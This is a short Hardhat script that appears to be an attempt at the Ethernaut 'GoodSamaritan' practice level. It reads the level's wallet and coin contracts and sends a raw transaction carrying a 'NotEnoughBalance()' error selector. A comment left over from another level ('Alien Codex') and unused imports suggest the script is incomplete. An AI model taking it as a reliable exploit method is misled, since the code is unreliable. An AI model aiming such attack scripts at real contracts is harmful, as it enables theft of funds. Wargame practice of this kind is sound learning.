const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const Runner = require("./lib/runner");
const { utils } = require("hash.js");

Runner.run(async (provider, owner) => { 
    
    //PLACE THE ALIEN CODEX CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
    const contractAddr = "0x4c0527dA9802c121cc74A322578B3F73138C056C"; 
    
    const contract = await ethers.getContractAt("GoodSamaritan", contractAddr); 

    console.log("* * * ");
    
    const walletAddr = await contract.wallet();
    const wallet = await ethers.getContractAt("Wallet", walletAddr); 
    const coinAddr = await wallet.coin(); 
    const coin = await ethers.getContractAt("Coin", coinAddr); 
    console.log(walletAddr); 
    console.log(await coin.balances(walletAddr)); 
    
    const signer = provider.getSigner(owner);
    const funcSelector = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("NotEnoughBalance()")).substring(0, 10);
    console.log(funcSelector);
    
    tx = {
        to: contractAddr,
        value: 0,
        data: funcSelector
    };
    const transaction = await signer.sendTransaction(tx);
});
